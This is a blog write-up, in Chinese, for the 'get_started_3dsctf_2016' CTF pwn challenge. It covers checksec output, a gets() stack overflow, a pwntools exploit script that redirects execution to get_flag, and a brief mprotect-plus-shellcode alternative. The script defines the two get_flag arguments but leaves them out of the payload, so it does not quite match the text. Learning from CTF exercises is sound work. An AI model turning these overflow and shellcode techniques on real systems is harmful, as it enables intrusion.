---
layout:     post   				    # 使用的布局（不需要改）
title:      get_started_3dsctf_2016 WriteUp				# 标题 
subtitle:   Eutopia's Blog #副标题
date:       2023-11-10 				# 时间
author:     Eutopia 						# 作者
header-img: img/post-bg-10.jpg 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								#标签
    - CTF
    - PWN
---



# get_started_3dsctf_2016 WriteUp

## 考点

- 对栈溢出函数带参数的溢出理解

## 解题内容

1. 使用`checksec`工具查看基本信息：

   ```shell
   ❯ ~/.local/bin/checksec ./get_started_3dsctf_2016
   [*] '/home/bronya/Documents/ctf/pwn/get_started_3dsctf_2016/get_started_3dsctf_2016'
       Arch:     i386-32-little
       RELRO:    Partial RELRO
       Stack:    No canary found
       NX:       NX enabled
       PIE:      No PIE (0x8048000)
   ```

   可以看到为32位程序，只开了nx防护。

2. ida工具打开程序，反编译，有主要函数`main`，`get_flag`

   `main`：

   ![main](/img/posts/2023-11-10-get_started_3dsctf_2016_WriteUp/images/main.png)

   `get_flag`：

   ![get_flag](/img/posts/2023-11-10-get_started_3dsctf_2016_WriteUp/images/get_flag.png)

   存在漏洞点为`main`函数中的`gets(v4)`，因此可以通过此进行栈溢出将返回地址改为`get_flag`函数地址，获取flag

3. 在本地测试成功，但是进行远程测试出现问题，发现远程程序崩溃了，应该是因为栈的数据被破坏，导致程序无法完整运行：

   ![远程-有问题](/img/posts/2023-11-10-get_started_3dsctf_2016_WriteUp/images/远程-有问题.png)

4. 考虑在`get_flag`后加上`exit`函数以及`get_flag`所需的两个参数，使其正常完成并退出。

   构造python脚本如下：

   ```python
   from pwn import *
   
   context(arch="i386", log_level="debug")
   p = process("./get_started_3dsctf_2016")
   # p = remote("node4.buuoj.cn", 25523)
   
   get_flag = 0x080489B8
   exit = 0x0804E6A0
   retn = 0x08048A40
   a1 = 0x308CD64F
   a2 = 0x195719D1
   
   # gdb.attach(p, 'b *0x8048A3B')
   payload = flat(b'a'*56, get_flag, exit)
   p.sendline(payload)
   p.interactive()
   ```

5. 成功获取flag

   ![results](/img/posts/2023-11-10-get_started_3dsctf_2016_WriteUp/images/results.png)

6. 另外还有一种思路是程序中存在mprotect函数，可以修改程序中某一段地址的读写执行权限，因此可以将某段bss地址修改，并写入shellcode，令程序跳转到bss地址即可拿到shell。

   